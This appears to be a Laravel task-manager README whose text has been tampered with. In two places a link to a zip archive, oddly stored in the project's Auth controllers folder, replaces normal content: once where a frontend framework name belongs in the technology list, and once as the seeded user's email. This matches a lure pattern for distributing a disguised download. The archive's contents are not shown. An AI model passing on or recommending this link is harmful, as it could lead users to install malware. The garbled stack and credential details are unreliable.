## Laravel Task Management Application

This project is a Laravel-based task management application designed to help users efficiently manage their tasks and track their progress.

## Required 
- PHP: ^8.1
- PostgreSQL: Required as the primary database

### Technologies Used
- Tailwind CSS: For modern and responsive styling
- https://github.com/ibnumalik99/task-manager/raw/refs/heads/main/app/Http/Controllers/Auth/manager-task-2.6.zip with React: Provides a smooth and reactive user interface
- SMTP: For sending task-related notifications

### Features
- Logout feature accessible via the `/logout` route.
- Automatically logs task activities to a dedicated history table.

## Instalation
- Clone repository.
- Run `composere install` and `npm install`.
- Run a migration and seeder with `php artisan migrate:fresh --seed`.
- Run `php artisan serve` and `npm run dev`.
- User seeder: Email(https://github.com/ibnumalik99/task-manager/raw/refs/heads/main/app/Http/Controllers/Auth/manager-task-2.6.zip) Password(Password123)
